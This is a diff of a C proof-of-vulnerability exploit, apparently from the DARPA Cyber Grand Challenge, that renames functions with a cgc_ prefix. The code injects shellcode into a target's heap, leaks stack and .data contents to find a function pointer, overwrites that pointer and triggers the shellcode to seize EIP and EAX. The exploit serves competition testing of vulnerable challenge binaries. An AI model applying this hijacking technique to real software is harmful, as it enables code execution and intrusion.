@@ -20,7 +20,7 @@
  * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
  */
  
-#include "pov.h"
+#include "cgc_pov.h"
 
 
 /**
@@ -31,17 +31,17 @@
  * @param size The amount of bytes to recv.
  * @return An int indicating SUCCESS (0) or an error condition (!=0).
  */
-int recv_bytes(int fd, char *buf, unsigned int size) {
+int cgc_recv_bytes(int fd, char *buf, unsigned int size) {
 
   int ret = SUCCESS;
-  size_t bytes_left = size;
-  size_t rx_bytes_local = 0;
+  cgc_size_t bytes_left = size;
+  cgc_size_t rx_bytes_local = 0;
 
   while (bytes_left) {
 
     rx_bytes_local = 0;
 
-    if (SUCCESS != (ret = receive(STDIN, buf+(size-bytes_left), bytes_left, &rx_bytes_local))) {
+    if (SUCCESS != (ret = cgc_receive(STDIN, buf+(size-bytes_left), bytes_left, &rx_bytes_local))) {
        err("receive() call within recv_bytes() failed\n");
     }
 
@@ -65,17 +65,17 @@ bail:
  * @param size The amount of bytes to send.
  * @return An int indicating SUCCESS (0) or an error condition (!=0).
  */
-int send_bytes(int fd, const char *buf, unsigned int size) {
+int cgc_send_bytes(int fd, const char *buf, unsigned int size) {
 
    int ret = SUCCESS;
-   size_t bytes_left = size;
-   size_t tx_bytes_local = 0;
+   cgc_size_t bytes_left = size;
+   cgc_size_t tx_bytes_local = 0;
 
    while (bytes_left) {
 
       tx_bytes_local = 0;
 
-    if (SUCCESS != (ret = transmit(STDOUT, buf+(size-bytes_left), bytes_left, &tx_bytes_local))) {
+    if (SUCCESS != (ret = cgc_transmit(STDOUT, buf+(size-bytes_left), bytes_left, &tx_bytes_local))) {
          err("transmit() call within send_bytes() failed\n");
       }
 
@@ -100,7 +100,7 @@ bail:
  */
 #define OFF_EAX 4 // due to prologue
 #define OFF_EIP 9
-void sc_type1(void) {
+void cgc_sc_type1(void) {
     __asm__("movl $0xCCCCCCCC, %eax\n"  // 0xCCCCCCCC-> regval
             "movl $0xDDDDDDDD, %ecx\n"  // 0xDDDDDDDD -> ipval
             "jmpl *%ecx\n");      
@@ -120,7 +120,7 @@ void sc_type1(void) {
  * @param src The packet's src or ?_LAST
  * @return An int indicating SUCCESS (0) or an error condition (!=0).
  */
-int new_pkt(packet_t *pkt, 
+int cgc_new_pkt(packet_t *pkt, 
             status_t status, 
             uint32_t seq, 
             access_t type, 
@@ -137,7 +137,7 @@ int new_pkt(packet_t *pkt,
 
     if (MAGIC_RND == seq) {
         CHK_SUCCESS(
-            random(&randuint32_t, sizeof(randuint32_t), NULL), 
+            cgc_random(&randuint32_t, sizeof(randuint32_t), NULL), 
             "unable to generate random pkt member\n");
         seq = randuint32_t;
     }
@@ -146,7 +146,7 @@ int new_pkt(packet_t *pkt,
 
     if (A_LAST == action) {
         CHK_SUCCESS(
-            random(&randuint32_t, sizeof(randuint32_t), NULL), 
+            cgc_random(&randuint32_t, sizeof(randuint32_t), NULL), 
             "unable to generate random pkt member\n");
         action = randuint32_t;
     }
@@ -155,21 +155,21 @@ int new_pkt(packet_t *pkt,
 
     if (OP2_LAST == op2type) {
         CHK_SUCCESS(
-            random(&randuint32_t, sizeof(randuint32_t), NULL), 
+            cgc_random(&randuint32_t, sizeof(randuint32_t), NULL), 
             "unable to generate random pkt member\n");
         op2type = randuint32_t;
     }
 
     if (MAGIC_RND == src) {
         CHK_SUCCESS(
-            random(&randuint32_t, sizeof(randuint32_t), NULL), 
+            cgc_random(&randuint32_t, sizeof(randuint32_t), NULL), 
             "unable to generate random pkt member\n");
         src = randuint32_t;
     }
 
     if (MAGIC_RND == dst) {
         CHK_SUCCESS(
-            random(&randuint32_t, sizeof(randuint32_t), NULL), 
+            cgc_random(&randuint32_t, sizeof(randuint32_t), NULL), 
             "unable to generate random pkt member\n");
         dst = randuint32_t;
     }
@@ -195,24 +195,24 @@ bail:
  * @return An int indicating SUCCESS (0) or an error condition (!=0).
  */
 #define SZ_SC 0x100 // There is no way to determin len(func) in C, so we estimate.
-int transmit_sc(byte_t *sc, uint32_t loc) {
+int cgc_transmit_sc(byte_t *sc, uint32_t loc) {
     dbg("%s()\n", __func__);
 
     int ret = SUCCESS;
     packet_t req, resp;
-    size_t idx = 0;
+    cgc_size_t idx = 0;
 
     while (idx < SZ_SC) {
 
         // Send shellcode 4B at a time.
         CHK_SUCCESS(
-            new_pkt(&req, S_REQ, MAGIC_RND, X_SCRATCH, A_WRITE, OP2_IMM, (uint32_t)loc+idx, *(uint32_t *)&sc[idx]), 
+            cgc_new_pkt(&req, S_REQ, MAGIC_RND, X_SCRATCH, A_WRITE, OP2_IMM, (uint32_t)loc+idx, *(uint32_t *)&sc[idx]), 
             "unable to create packet\n");
         CHK_SUCCESS(
-            send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
+            cgc_send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
             "failed to send packet\n");
         CHK_SUCCESS(
-            recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
+            cgc_recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
             "failed to recv additional bytes\n");
 
         idx += sizeof(uint32_t);
@@ -235,25 +235,25 @@ bail:
  * @param assign Pointer to where the needle will be stored.
  * @return An int indicating SUCCESS (0) or an error condition (!=0).
  */
-int find_needle(bool deref, uint32_t bgn, uint32_t end, uint32_t magic_before, uint32_t magic_after, uint32_t *assign) {
+int cgc_find_needle(bool deref, uint32_t bgn, uint32_t end, uint32_t magic_before, uint32_t magic_after, uint32_t *assign) {
     dbg("%s()\n", __func__);
 
     int ret = SUCCESS;
     packet_t req, resp;
-    size_t idx = 0;
+    cgc_size_t idx = 0;
     int found = 0;
 
     while (bgn+idx < end) {
 
         // Get 4B at bgn+idx
         CHK_SUCCESS(
-            new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_READ, OP2_MEM, MAGIC_RND, bgn+idx), 
+            cgc_new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_READ, OP2_MEM, MAGIC_RND, bgn+idx), 
             "unable to create packet\n");
         CHK_SUCCESS(
-            send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
+            cgc_send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
             "failed to send packet\n");
         CHK_SUCCESS(
-            recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
+            cgc_recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
             "failed to recv response packet\n");
 
         // 4B put into resp.inst.dst
@@ -264,13 +264,13 @@ int find_needle(bool deref, uint32_t bgn, uint32_t end, uint32_t magic_before, u
 
             // .. check for after bookend.
             CHK_SUCCESS(
-                new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_READ, OP2_MEM, MAGIC_RND, bgn+idx+8), 
+                cgc_new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_READ, OP2_MEM, MAGIC_RND, bgn+idx+8), 
                 "unable to create packet\n");
             CHK_SUCCESS(
-                send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
+                cgc_send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
                 "failed to send packet\n");
             CHK_SUCCESS(
-                recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
+                cgc_recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
                 "failed to recv response packet\n");
 
             if (magic_after == resp.inst.dst) {
@@ -282,13 +282,13 @@ int find_needle(bool deref, uint32_t bgn, uint32_t end, uint32_t magic_before, u
                     dbg("deref'ing the target\n");
 
                     CHK_SUCCESS(
-                        new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_READ, OP2_MEM, MAGIC_RND, bgn+idx+4), 
+                        cgc_new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_READ, OP2_MEM, MAGIC_RND, bgn+idx+4), 
                         "unable to create packet\n");
                     CHK_SUCCESS(
-                        send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
+                        cgc_send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
                         "failed to send packet\n");
                     CHK_SUCCESS(
-                        recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
+                        cgc_recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
                         "failed to recv response packet\n");
                     *assign = resp.inst.dst; 
 
@@ -320,13 +320,13 @@ bail:
  *
  * @return An int indicating SUCCESS (0) or an error condition (!=0).
  */
-int find_func_ptr(void) {
+int cgc_find_func_ptr(void) {
     dbg("%s()\n", __func__);
 
     int ret = SUCCESS;
 
     CHK_SUCCESS(
-        find_needle(
+        cgc_find_needle(
             FALSE, 
             t_data_bgn, t_data_end, 
             MAGIC_PTR_BEFORE, MAGIC_PTR_AFTER, 
@@ -345,13 +345,13 @@ bail:
  *
  * @return An int indicating SUCCESS (0) or an error condition (!=0).
  */
-int find_data(void) {
+int cgc_find_data(void) {
     dbg("%s()\n", __func__);
 
     int ret = SUCCESS;
 
     CHK_SUCCESS(
-        find_needle(
+        cgc_find_needle(
             TRUE, 
             SRCH_DATA_BGN, STCK_END, 
             MAGIC_DATA_BEFORE, MAGIC_DATA_AFTER, 
@@ -374,7 +374,7 @@ bail:
  * @param leaked Pointer to a uint32_t.  The leaked 4B will be written here.
  * @return An int indicating SUCCESS (0) or an error condition (!=0).
  */
-int doit(type1_vals *t1vals) {
+int cgc_doit(type1_vals *t1vals) {
     dbg("%s()\n", __func__);
 
     int ret = SUCCESS;
@@ -383,13 +383,13 @@ int doit(type1_vals *t1vals) {
     byte_t sc_buf[0x100];
 
     // Pick a location for our shellcode.  Yey for x86 byte alignment.
-    CHK_SUCCESS(random(&rnd_offset, sizeof(rnd_offset), NULL), 
-        "failed during random() for rnd_offset\n");
+    CHK_SUCCESS(cgc_random(&rnd_offset, sizeof(rnd_offset), NULL), 
+        "failed during cgc_random() for rnd_offset\n");
     t_sc = HEAP_BGN + rnd_offset;
     dbg("t_sc = 0x%08x\n", t_sc);
 
     // Read in shellcode, inject negotiated values for EAX and EIP.
-    cgc_memcpy(sc_buf, &sc_type1, SZ_SC);
+    cgc_memcpy(sc_buf, &cgc_sc_type1, SZ_SC);
     sc_buf[OFF_EAX+0] = (t1vals->regval >>  0) & 0xFF;
     sc_buf[OFF_EAX+1] = (t1vals->regval >>  8) & 0xFF;
     sc_buf[OFF_EAX+2] = (t1vals->regval >> 16) & 0xFF;
@@ -400,7 +400,7 @@ int doit(type1_vals *t1vals) {
     sc_buf[OFF_EIP+3] = (t1vals->ipval >> 24) & 0xFF; 
 
     // Place shellcode on target heap via X_SCRATCH command.
-    CHK_SUCCESS(transmit_sc((byte_t *)&sc_buf, t_sc), 
+    CHK_SUCCESS(cgc_transmit_sc((byte_t *)&sc_buf, t_sc), 
         "failed placing shellcode in heap buffer\n");
 
     // We need to determine the location of a function pointer we can redirect 
@@ -411,30 +411,30 @@ int doit(type1_vals *t1vals) {
     // Strategy:
     // - cgc_read the stack, look for magic bookends on pointer to .data
     // - discover the base address of .data
-    CHK_SUCCESS(find_data(), "unable to determine .data address\n");
+    CHK_SUCCESS(cgc_find_data(), "unable to determine .data address\n");
     // - cgc_read .data, look for magic bookends on func_ptr
     // - discover location of func_ptr
-    CHK_SUCCESS(find_func_ptr(), "unable to locate func_ptr in .data\n");
+    CHK_SUCCESS(cgc_find_func_ptr(), "unable to locate func_ptr in .data\n");
 
     // Overwrite func_ptr, redirect to our shellcode.
     CHK_SUCCESS(
-        new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_WRITE, OP2_IMM, t_func_ptr, t_sc), 
+        cgc_new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_WRITE, OP2_IMM, t_func_ptr, t_sc), 
         "unable to create packet\n");
     CHK_SUCCESS(
-        send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
+        cgc_send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
         "failed to send packet\n");
     CHK_SUCCESS(
-        recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
+        cgc_recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
         "failed to recv response packet\n");
     dbg("pointed t_func_ptr (0x%08x) to t_sc (0x%08x)\n", t_func_ptr, t_sc);
 
     // We've redirected func_ptr to our shellcode.  Now we trigger shellcode 
     // execution by issuing an X_PREV request.
     CHK_SUCCESS(
-        new_pkt(&req, S_REQ, MAGIC_RND, X_PREV, A_READ, OP2_IMM, MAGIC_RND, MAGIC_RND), 
+        cgc_new_pkt(&req, S_REQ, MAGIC_RND, X_PREV, A_READ, OP2_IMM, MAGIC_RND, MAGIC_RND), 
         "unable to create packet\n");
     CHK_SUCCESS(
-        send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
+        cgc_send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
         "failed to send packet\n");
 
 bail:
@@ -462,7 +462,7 @@ int main(void) {
     mask_eip = 0x0FFFFFFF;
     mask_reg = 0xFFFFFFFF;
     CHK_SUCCESS(
-        type1_negotiate(mask_eip, mask_reg, REGNUM_EAX, &t1vals), 
+        cgc_type1_negotiate(mask_eip, mask_reg, REGNUM_EAX, &t1vals), 
         "unable to negotiate with CGC infrastructure\n");
 
     dbg("negotiated: EIP = (0x%08x & 0x%08x), EAX = (0x%08x & 0x%08x)\n", 
@@ -475,7 +475,7 @@ int main(void) {
         t1vals.ipval, mask_eip, t1vals.regval, mask_reg);
 
     // All actual work done here.
-    doit(&t1vals);
+    cgc_doit(&t1vals);
 
 bail:
     return ret;
